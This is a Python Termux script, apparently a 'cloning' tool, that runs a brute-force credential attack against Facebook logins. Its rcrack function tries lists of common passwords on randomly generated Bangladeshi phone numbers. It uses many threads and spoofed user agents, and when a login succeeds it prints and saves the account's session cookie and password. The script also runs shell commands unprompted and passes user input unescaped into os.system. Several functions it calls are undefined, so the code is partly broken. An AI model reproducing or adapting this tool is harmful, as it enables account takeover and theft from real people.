import os
import sys
import time
import requests
import uuid
os.system("git pull")
os.system("pkg install espeak")
class jalan: 

    def __init__(self, z):

        pass

sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
A = '\x1b[1;97m' 
#B = '\x1b[1;96m' 
BLACK = '\x1b[1;90m' 
C = '\x1b[1;91m' 
D = '\x1b[1;92m'
M = '\033[1;31m'
H = '\033[1;32m'
N = '\x1b[1;37m'    
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'
#
WW = '\033[97;1m' 
RR = '\033[91;1m' 
GG = '\033[92;1m' 
YY = '\033[93;1m' 
BB = '\033[94;1m'
PP = '\033[95;1m'
CC = '\033[96;1m'
NN = '\x1b[0m'
#

RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
HBF = '{ HBF }'
my_color = [
 P, M, H, K, B, U, O, N]




def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)
               
def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)
        
os.system("clear")
import requests,os
#os.system('espeak -a 400 "type your name"')
fuckx=str(input("\033[1;97m[\033[92;1m?\033[1;97m] ENTER YOUR NAME :\033[1;97m "))
name=fuckx.upper()
print ('')
#os.system('espeak -a 400 "WELCOME MY TOOLS "' +name)
psb('\033[1;97m[\033[92;1m•\033[1;97m]\033[1;97m WELCOME MY TOOLS \033[1;94m '+name)
print('')

print('\033[1;92m Tools Updating.....')
print('')
jalan('\033[1;94m LOADING \033[1;32m●\033[1;35m●\033[1;34m●\033[1;97m●\033[1;33m●\033[38;5;196m●\033[1;35m●\033[1;34m●\033[1;33m●\033[1;32m●\033[1;97m●\033[38;5;196m●\033[38;5;46m●\033[38;5;196m●\033[1;32m●\033[1;97m●\033[1;35m●\033[1;34m●\033[1;33m●\033[38;5;46m●\033[1;97m●')
time.sleep(2)




loop = 0
cp = []
ok = []
uid = []
def clear():
    os.system('clear')
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    
logo3 = ("""     

  \033[33;1m𝐑𝐎𝐂𝐊𝐘═══════\033[34;1m══════════\x1b[38;5;196m════════\033[34;1m═══════\033[38;5;46m𝐊𝐇𝐀𝐍
\033[38;5;46m╔═══╗\x1b[38;5;196m╔═══╗\033[34;1m╔═══╗\033[37;1m╔╗╔═╗\033[33;1m╔╗  ╔╗ {𝄟⃝====𝗥}
\033[38;5;46m║╔═╗║\x1b[38;5;196m║╔═╗║\033[34;1m║╔═╗║\033[37;1m║║║╔╝\033[33;1m║╚╗╔╝║  \033[38;5;46m{𝄟⃝====𝗢}
\033[38;5;46m║╚═╝║\x1b[38;5;196m║║ ║║\033[34;1m║║ ╚╝\033[37;1m║╚╝╝ \033[33;1m╚╗╚╝╔╝ \033[33;1m{𝄟⃝====𝗖}
\033[38;5;46m║╔╗╔╝\x1b[38;5;196m║║ ║║\033[34;1m║║ ╔╗\033[37;1m║╔╗║\033[33;1m ╚╗╔╝   \033[37;1m{𝄟⃝====𝗞}
\033[38;5;46m║║║╚╗\x1b[38;5;196m║╚═╝║\033[34;1m║╚═╝║\033[37;1m║║║╚╗\033[33;1m║║     \033[38;5;46m{𝄟⃝====𝗬}
\033[38;5;46m╚╝╚═╝\x1b[38;5;196m╚═══╝\033[34;1m╚═══╝\033[37;1m╚╝╚═╝\033[33;1m╚╝     \x1b[38;5;196m{𝄟⃝====𝐍}
\033[33;1m𝐑𝐎𝐂𝐊𝐘═══════\033[34;1m══════════\x1b[38;5;196m════════\033[34;1m═══════\033[38;5;46m𝐊𝐇𝐀𝐍
\033[41m \033[1;37m           [ROCKY RAHMAN]               \x1b[0m
\033[1;32m┌───────────────────────────────────────┐   ASHA AMR JAN 😇
\033[1;33m│ [✓] Admin   : MD. ABEDUR RAHMAN\033[1;32m       │
\033[1;34m│ [✓] Github  :\033[41m\033[1;37mD4rK-B0y\x1b[0m                 │
\033[1;35m│ [✓] Whtsapp : 01863517***             │
\033[1;36m│ [✓] Youtube : \x1b[1;32mABID ALL HUB\x1b[1;97m            │               
\033[1;32m└───────────────────────────────────────┘   V4""")


def linex():


    os.system('clear')
    jalan(logo)
    print(' [1] FOLLOW ME ON GITHUB')
    print(' [2] EXIT')
    opt = input('\n   Choose option >>> ')
    if opt == '1':

        os.system('xdg-open https://www.facebook.com/bhaghi.bangla?mibextid=2JQ9oc')
        FD()
        return None
    None('\n\x1b[1;97mEXIT\x1b[0;97m')
7
def FD():
    os.system('clear')
    print(logo)
    print('\x1b[1;33m [1] CONTACT')
    print(' [2] EXIT')
    opt = input('\n  \x1b[1;32m Choose option >>> ')

    if opt == '1':
        os.system('xdg-open https://www.facebook.com/bhaghi.bangla?mibextid=2JQ9oc')
        ROCKY()

        return None
    None('\n\x1b[1;97mEXIT\x1b[0;97m')
def ROCKY():
    os.system('clear')
    jalan(logo)   
   # os.system('espeak -a 300 "WELCOME TO ROCKY KHAN"') 

    print("")   
    jalan("\033[1;91m [\033[1;97m1\033[1;91m]\033[1;97m RANDOM \033[1;91mCLONING  \033[38;5;120m(ON)")
    jalan("\033[1;91m [\033[1;97m2\033[1;91m]\033[1;97m GMAIL CLONING  \033[1;30m (OFF)")
    jalan("\033[1;91m [\033[1;97m3\033[1;91m]\033[1;97m RANDOM NORMAL  \033[38;5;120m (ON)")
    jalan("\033[1;91m [\033[1;97m4\033[1;91m]\033[1;97m CONTACT ME")

    #jalan(' \x1b[1;32m[5] \x1b[1;32mSUBSCRIBE MY CHANNEL')

    jalan("\033[1;91m [\033[1;97m5\033[1;91m]\033[1;97m SEPARATE IDZ")
    jalan("\033[1;91m [\033[1;97m0\033[1;91m]\033[1;97m Exit")
    opt = input('\n   \x1b[1;97m[▪︎] SELECT :- ')

    if opt == '1':
      #  os.system('espeak -a 300 "random cloning start"')
        time.sleep(0.5)
        i()

        return None

    if opt == '3':
        ROCKY_sanjida()
        return None
    if opt == '4':

        os.system('xdg-open https://www.facebook.com/bhaghi.bangla?mibextid=2JQ9oc')
        return None
    if opt == '2':
        ROCKY()
    if opt == '0':
        os.system('exit')
    if opt == '5':
        separate()
        return None

    #None('\n\x1b[1;31m  Choose valid option\x1b[0;97m')

import os,sys,time,json,random,re,string,platform,base64,uuid

print("\033[38;5;46m SYSTEM INSTALLING. . . . \033[1;30m")
#os.system("pkg install espeak")
print("\033[38;5;46m   [•] INSTALL COMPLETE \033[1;30m")
print("\033[38;5;46m   [•] UPDATE CHECKING..... \033[1;30m")
#os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu

try:

    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
    
except ModuleNotFoundError:

    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')   
    os.system("pkg install espeak")
    
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.0009)

            

RED = '\033[1;91m'#
WHITE = '\033[1;97m'#
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'#
BLUE = '\033[1;34m'#
ORANGE = '\033[1;35m'#
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU

my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()



os.system('xdg-open https://www.facebook.com/bhaghi.bangla?mibextid=2JQ9oc') 
logo =("""     
\033[33;1m𝐑𝐎𝐂𝐊𝐘═══════\033[34;1m══════════\x1b[38;5;196m════════\033[34;1m═══════\033[38;5;46m𝐊𝐇𝐀𝐍
\033[38;5;46m╔═══╗\x1b[38;5;196m╔═══╗\033[34;1m╔═══╗\033[37;1m╔╗╔═╗\033[33;1m╔╗  ╔╗ {𝄟⃝====𝗥}
\033[38;5;46m║╔═╗║\x1b[38;5;196m║╔═╗║\033[34;1m║╔═╗║\033[37;1m║║║╔╝\033[33;1m║╚╗╔╝║  \033[38;5;46m{𝄟⃝====𝗢}
\033[38;5;46m║╚═╝║\x1b[38;5;196m║║ ║║\033[34;1m║║ ╚╝\033[37;1m║╚╝╝ \033[33;1m╚╗╚╝╔╝ \033[33;1m{𝄟⃝====𝗖}
\033[38;5;46m║╔╗╔╝\x1b[38;5;196m║║ ║║\033[34;1m║║ ╔╗\033[37;1m║╔╗║\033[33;1m ╚╗╔╝   \033[37;1m{𝄟⃝====𝗞}
\033[38;5;46m║║║╚╗\x1b[38;5;196m║╚═╝║\033[34;1m║╚═╝║\033[37;1m║║║╚╗\033[33;1m║║     \033[38;5;46m{𝄟⃝====𝗬}
\033[38;5;46m╚╝╚═╝\x1b[38;5;196m╚═══╝\033[34;1m╚═══╝\033[37;1m╚╝╚═╝\033[33;1m╚╝     \x1b[38;5;196m{𝄟⃝====𝐍}
\033[33;1m𝐑𝐎𝐂𝐊𝐘═══════\033[34;1m══════════\x1b[38;5;196m════════\033[34;1m═══════\033[38;5;46m𝐊𝐇𝐀𝐍
\033[41m \033[1;37m           [ROCKY RAHMAN]               \x1b[0m
\033[33;1m╔═══════\033[34;1m══════════\x1b[38;5;196m════════\033[34;1m══════\033[38;5;46m════╗
\x1b[38;5;196m║\033[38;5;46m𝗡𝗔𝗠𝗘\033[33;1m          ║\033[38;5;46m𝐑𝐎𝐂𝐊𝐘 𝐊𝐇𝐀𝐍\033[38;5;44m          ║
\x1b[38;5;196m║\033[38;5;46m𝐌𝐎𝐁𝐈𝐋𝐄\033[33;1m        ║\x1b[38;5;196m01617260495\033[38;5;46m         ║
\x1b[38;5;196m║\033[38;5;46m𝐑𝐀𝐍𝐃𝐎𝐌\033[33;1m        ║\033[33;1m𝐕𝐄𝐑𝐒𝐈𝐎𝐍0.6\033[38;5;43m          ║
\x1b[38;5;196m║\033[38;5;46m𝐓𝐎𝐎𝐋𝐒\033[33;1m         ║\033[33;1m𝐓𝐄𝐑𝐌𝐔𝐗 𝐇𝐀𝐂𝐊𝐈𝐍𝐆 𝐀-𝐙\033[38;5;46m  ║
\033[33;1m╚═══════\033[34;1m══════════\x1b[38;5;196m════════\033[34;1m══════\033[38;5;46m════╝
\033[1;94m═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━══
\033[1;97m Status : \033[38;5;46mFREE
\033[1;94m═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━══  """)
loop = 0
oks = []
cps = []
def clear():

    os.system('clear')
    print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:

    a = ltx
    tag = "AM"

    

    

try:
    print('\n\n\033[1;92m Updating..... \033[0;97m')
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('clear')

    else:pass

except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:

        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)

 

#User agents
ugen2=[]
ugen=[' Mozilla/5.0 (Linux; U; Android 10; CPH2351 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/ 76.0.3046.89 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 15; R7sf Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/ 89.0.3952.79 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 10; CPH2351 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/ 76.0.3046.89 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 4.4.4; OPD2102A Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/ 40.0.4793.43 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 11; oppo6833 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/ 91.0.3325.42 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 8.1.0; PGW110 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/ 85.0.5356.92 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 14; oppo6833 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/ 74.0.4389.83 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 6.0.1; PGW110 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/ 54.0.4080.57 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 5.1; OPD2102A Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/ 96.0.4530.86 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 5.1; PGW110 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/ 57.0.4092.33 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 4.4.4; 1201 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/ 96.0.3582.31 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 4.4.4; CPH2513 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/ 59.0.5757.20 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 10; PGCM10 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/ 81.0.4311.55 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 7.1.1; CPH2591 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/ 66.0.5510.72 Mobile Safari/537.36']


for xd in range(100000):
    aa='Mozilla/5.0 (Linux; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,160)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
	

for x in range(999):

	rc = random.choice

	rr = random.randint

	aZ = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
	A = f'Mozilla/5.0 (Linux; Android {str(rr(5,12))}; Redmi Note '
	B = f'{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}{str(rr(11,99))}{str(rc(aZ))} '
	C = f'{str(rr(5,12))}) AppleWebKit/537.36 (KHTML, like Gecko)'
	D = f' Chrome/{str(rr(20,100))}.0.{str(rr(1111,9999))}.{str(rr(20,100))}'
	E = f' Mobile Safari/537.36'
	F = f'{A}{C}{D}{E}'

	

    

# APK CHECK

def i():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    jalan(logo)   
    jalan("\033[1;94m\t  USE OUR SIM CODE  ") 
    jalan('\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    jalan('\033[1;97m     \t     BD CODE\n     \033[1;33m88016  \033[1;35m88017  \033[1;92m88018  \033[1;96m88019  ...\033[0;97m')   
    print(34*'_')
    jalan('\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n')
    code = input(' \033[1;97mPUT CODE : ')
    print("")
    limit = int(input(' \033[1;97mEXAMPLE:  \033[1;35m5000,  \033[1;92m10000,  \033[1;93m20000\n\n PUT CLONING LIMIT: '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    os.system("clear")
    print(logo)  
    passx = int(input("[*] Type 0 and Enter : "))
    HamiiID = []
    print("")
    for bilal in range(passx):
    	
        pww = input("[*] Enter Password : ")
        HamiiID.append(pww)
    with ThreadPool(max_workers=50) as manshera:
    	
        clear()

        tl = str(len(user))

        print('\033[1;97m  [\033[38;5;48m●\033[1;97m] Selected Code :\x1b[38;5;46m '+code)        
        print('\033[1;97m  [\033[38;5;47m●\033[1;97m] Total Ids :\033[38;5;46m '+tl)       
        print('\033[1;97m  [\033[38;5;41m●\033[1;97m] Your Name :\033[38;5;46m '+name)        
        print('\033[1;97m  [\033[38;5;42m●\033[1;97m] User-Agent :\033[38;5;46m '+str(len(ugen)))        
        print(f"\033[1;97m  [\033[1;92m▪︎\033[1;97m]  Target Doamin:\033[1;92m {doamin}")
        print(f"\033[1;97m  [\033[38;5;43m●\033[1;97m] Region : \033[38;5;46mBANGLA\033[1;91mDESH")        
        print(' \033[1;97m [\033[38;5;44m●\033[1;97m] The process has been started')        
        print('  [\033[38;5;46m●\033[1;97m] Use \033[0;31maroplane \033[1;97mmode first bro ;)')
        print(35*'_')
        print('\033[1;91m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
        print('')

        for love in user:
            pwx = [love[0:],love[1:],'bangladesh','free fire','i love you','Bangladesh','I Love You','Free Fire']
            uid = code+love
            for Eman in HamiiID:
                pwx.append(Eman)
            manshera.submit(rcrack,uid,pwx,tl)

    print('\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    print('Crack process has been completed')
    print('Ids saved in ok.txt,cp.txt')
    print('\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')

#x = open('/sdcard/1ua.txt','r').read().splitlines()
def ROCKY_sanjida():
	user=[]
	os.system('clear')
	print(logo)
	print(" Sim code Example : 016, 017, 018, 019")
	kode = input(' [💀] Enter sim code: ')
	doamin = ' BD Number id cloner [APK] '
	limit = int(input('[?] How many numbers do you want to add : '))
	for nmbr in range(limit):
		koda = ''.join(random.choice(string.digits) for _ in range(2))
		kodb = ''.join(random.choice(string.digits) for _ in range(2))
		nmp = ''.join(random.choice(string.digits) for _ in range(4))
		user.append(nmp)
	with ThreadPool(max_workers=50) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(user))
		print('\033[1;97m [●]  Total ids:\033[38;5;46m '+tl)
		print(f'\033[1;97m [●]  Usaragents : '+str(len(ugen)))
		print(f'\033[1;97m [●]\033[1;97m  target sim code :\033[1;92m {kode} ')
		#print(f"\033[1;97m [●]  version:\033[1;92m {doamin}")
		print(' \033[1;97m[●]  The process has been started')
		print('\033[1;97m [●]  use airplane mode if ok ids not come ')
		print(50*'_')
		for guru in user:
			uid = kode+koda+kodb+guru
			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','bangladesh','Bangladesh','i love you','i hate you','free fire','বাংলাদেশ','Bangla','khan123','@@@###']
			yaari.submit(rcrack,uid,pwx,tl)
	print(50*'_')
	print(' [😳] Crack process has been completed')
	print(' [😳] Ids saved in ok.txt,cp.txt')
	print(50*'_')
	exit()
    
def rcrack(uid,pwx,tl):

    #print(user)

    global loop

    global cps

    global oks

    global proxy

    try:

        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {
           'authority': 'free.facebook.com',
            'method':'GET',
            'path': '/',
            'scheme':'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'dpr': '1.8000000715255737',
            'referer': 'https://mbasic.facebook.com/',
            'sec-ch-prefers-color-scheme': 'dark',
            'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="114", "Google Chrome";v="114"',
            'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="114.0.5766.221", "Google Chrome";v="114.0.5766.221"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-model': '"MED-LX9"',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '""',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent':pro}
            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=101',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f'\r\33[1;92m [OK] '+cid+' | '+ps+'\33[0;92m')
                print(f'\r\33[1;93m [💚] Number : {uid}')
                print(f'\r\033[1;94m [🔥] COOKIE :\033[1;97m '+coki)
                cek_apk(session,coki)
                oks.append(cid)
                open('/sdcard/AM-OK.txt', 'a').write(cid+' | '+ps+'\n')
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\r\r\033[0;92m[ROCKY-ok-]  ' +uid+ ' | ' +ps+ ' \033[0;97m')
                open('/sdcard/ROCKY-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:	
                continue
        loop+=1
        sys.stdout.write('\r[\033[0;93m𝐂𝐎𝐔𝐍𝐓𝐈𝐍𝐆\033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] - [CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except requests.exceptions.ConnectionError:
	    pass

def separate():
    os.system('clear')
    print (logo)
    print ('\033[1;37mSeparate Links From File\033[0;97m')
    print (47*'-')
    file_name = input('\033[1;37mInput file name: ')
    print(47*'-')
    if file_name == '':
        main_menu()
    print ('\033[1;32mFor Example /sdcard/ROCKY.txt\033[0;97m')
    print (47*'-')
    new_save = input('\033[1;37mSave New file Name: \033[0;97m')
    if "/sdcard/" not in new_save:
        print ('Put /sdcard/new+file+name.txt')
        time.sleep(2)
        separate()
    elif new_save == '':
        main_menu()
    try:
        limit = int(input('\033[1;32mHow many links do you want to separate? \033[0;97m'))
    except:
        limit = 1
    y = 0
    for y in range(limit):
        y+=1
        links = input('\033[0;97mSelect link %s: '%(y))
        os.system('cat '+file_name+' | grep '+links+' >> '+new_save)
    print(47*'-')
    print('\033[1;37mLinks Separate successfully')
    print('\033[1;32mNew file saved as: /sdcard/'+new_save)
    print(47*'-')
    input('\033[1;32mPress enter to back ')
    ROCKY()



ROCKY()

 
